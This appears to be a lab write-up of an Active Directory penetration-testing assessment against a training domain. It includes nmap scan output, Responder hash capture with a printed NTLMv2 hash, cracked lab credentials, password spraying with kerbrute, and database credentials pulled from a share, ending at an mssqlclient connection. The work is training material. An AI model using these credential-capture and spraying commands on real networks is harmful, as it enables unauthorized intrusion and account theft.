# AD Enumeration & Attacks - Skills Assessment Part II

After connecting to the machine with ssh, we discover 4 hosts up in the 172.16.7.240/23 network. And our VM is the 240

```
172.16.7.3, 172.16.7.50, 172.16.7.240, 172.16.7.60
```

#### 172.16.7.3

```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 128 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 128 Microsoft Windows Kerberos (server time: 2023-10-22 13:57:39Z)
135/tcp   open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 128
464/tcp   open  kpasswd5?     syn-ack ttl 128
593/tcp   open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 128
3268/tcp  open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 128
5985/tcp  open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 128 .NET Message Framing
47001/tcp open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49678/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49679/tcp open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49699/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49745/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
MAC Address: 00:50:56:B9:7C:B8 (VMware)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:7c:b8 (VMware)
| Names:
|   DC01<00>             Flags: <unique><active>
|   INLANEFREIGHT<00>    Flags: <group><active>
|   INLANEFREIGHT<1c>    Flags: <group><active>
|   DC01<20>             Flags: <unique><active>
|   INLANEFREIGHT<1b>    Flags: <unique><active>
```

#### 172.16.7.50

```
PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 128
3389/tcp  open  ms-wbt-server syn-ack ttl 128 Microsoft Terminal Services
|_ssl-date: 2023-10-22T14:00:45+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: MS01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: MS01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2023-10-22T14:00:39+00:00
| ssl-cert: Subject: commonName=MS01.INLANEFREIGHT.LOCAL
| Issuer: commonName=MS01.INLANEFREIGHT.LOCAL
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-21T13:09:54
| Not valid after:  2024-04-21T13:09:54
| MD5:   682e 137d 92c2 c9f0 a977 ddfc e18f d947
| SHA-1: 43f1 d179 e41d f981 9697 01f3 5515 8c3c d38b c172
| -----BEGIN CERTIFICATE-----
| MIIC9DCCAdygAwIBAgIQPNVocB/MnqFHnOScK6IWcjANBgkqhkiG9w0BAQsFADAj
| MSEwHwYDVQQDExhNUzAxLklOTEFORUZSRUlHSFQuTE9DQUwwHhcNMjMxMDIxMTMw
| OTU0WhcNMjQwNDIxMTMwOTU0WjAjMSEwHwYDVQQDExhNUzAxLklOTEFORUZSRUlH
| SFQuTE9DQUwwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC/FZ0wErg7
| KNOj2QtAUhtnGD1evN99sJqvKY8yoEvFcjbQnmMQgeZGnYtKMSoa6RwFdL4DpDk9
| wd1y3aJ1ethkefR3i50H+N92oArLpugUuuHx4IT/2voGHOj+xVWIBqOQ46yrrJEF
| xjNUdaV/qmFJ8r4+rLGXYLgFrK2bTo5jbwsyFKizOr9Li8n+YLYUn9eMKZyhUZxh
| SktNXjWSL+9rBDCoq2UxsAB/Lf2yOfSvcQ8YmXha/IDePlmmY6HO7e+BMlhlZc3h
| xKZ9rXHVtNs7kdGeO5aw5b3Vlckin2cQryWKQXo03Me9USx8lU5vAg+8mZMV+fM+
| adxJ9zUonMndAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQE
| AwIEMDANBgkqhkiG9w0BAQsFAAOCAQEAmplIfqsDlcNhnkfkgEH/qHq4XBgz+iIL
| I1rJNfx2mirLovsTsA4LXTAffIAymKgULC45EJxiI7M0ktGHG2wewnWfz3Ufrh6D
| GkxIovitmQ+B3CrZN5XU0ZvFgVOmZL1YJxGc6zaJq/mkCgS1HNgYvAb1SJgmacJb
| +mCfxqEekzx5Hf7qGS0vtQp7WHWfX+61uWF1PxtXENyVc5fr8aL9BDihyb4hugUq
| tnjvwja+jfZjsb6hd9/xuThTG8C3rGPOt/KnYKm/8dsYJr2V5MSdRpUMjGCAYPjW
| NT3CAnBL5MU7umntjBECrPu/J6TWKnIzPbd+FFN0KnThqBRogyoJaQ==
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
```

#### 172.16.7.60

```
PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 128
1433/tcp  open  ms-sql-s      syn-ack ttl 128 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-22T13:10:02
| Not valid after:  2053-10-22T13:10:02
| MD5:   7eeb 8a1b a6d7 d69a 48f5 1dac b792 d776
| SHA-1: 9a81 b7cd 533f 249d f3e9 f1ed c1c5 b380 b55b 015b
|_ssl-date: 2023-10-22T14:03:08+00:00; -1s from scanner time.
| ms-sql-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: SQL01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: SQL01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|_  Product_Version: 10.0.17763
5985/tcp  open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
MAC Address: 00:50:56:B9:67:98 (VMware)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: -1s
| ms-sql-info: 
|   Windows server name: SQL01
|   172.16.7.60\SQLEXPRESS: 
|     Instance name: SQLEXPRESS
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
```

## Foothold

Start a responder to obtain a user hash.

```
sudo responder -I ens224 -v

[SMB] NTLMv2-SSP Hash     : AB920::INLANEFREIGHT:12710a770d60e9f1:E7DBA9FA9F7B79D83F1C7A21CE4173A3:0101000000000000009081AAF404DA0160121601AD31AFDA00000000020008004D0058003700560001001E00570049004E002D003300580037003900410032004500530033004100560004003400570049004E002D00330058003700390041003200450053003300410056002E004D005800370056002E004C004F00430041004C00030014004D005800370056002E004C004F00430041004C00050014004D005800370056002E004C004F00430041004C0007000800009081AAF404DA0106000400020000000800300030000000000000000000000000200000DBD5C755EFDFBD76EC635B7F5BC6B6363621522AFA8337AD789941A9D602D15C0A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
```

After cracking it, we obtain the credentials `ab920/weasal` and try evil-winrm. We can connect to the 172.16.7.50 MS01 host.

#### Next User

Now, in order to discover another user, we have to do **password spray** to valid users.&#x20;

So first, we need to discover valid users, and save them to a file:

```
sudo crackmapexec smb 172.16.7.3 -u ab920 -p weasal --users | awk -F'\\' '{split($2, a, " "); print a[1]}' > valid_users.txt
```

And once we have it, let's user kerbrute (With the password **Welcome1** because is on the examples)

```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_users.txt Welcome1
```

And we discover one valid user:

```
023/10/25 14:07:58 >  [+] VALID LOGIN:	 BR086@inlanefreight.local:Welcome1
```

**BR086  /  Welcome1**&#x20;

### Database credentials

To obtain the database credentials, we can check the shares with `smbclient`

```
smbclient //172.16.7.3/Department\ Shares --user br086
```

And for this user, there is a file called `web.config` on `Department shares/IT/Private`

So now, we download the file and open it:&#x20;

```
User ID=netdb;Password=D@ta_bAse_adm1n!
```

**netdb  /  D@ta\_bAse\_adm1n!**

To connect to the database, we need to use the tool `mssqlclient` from impacket.

```
impacket-mssqlclient netdb@172.16.7.60
```
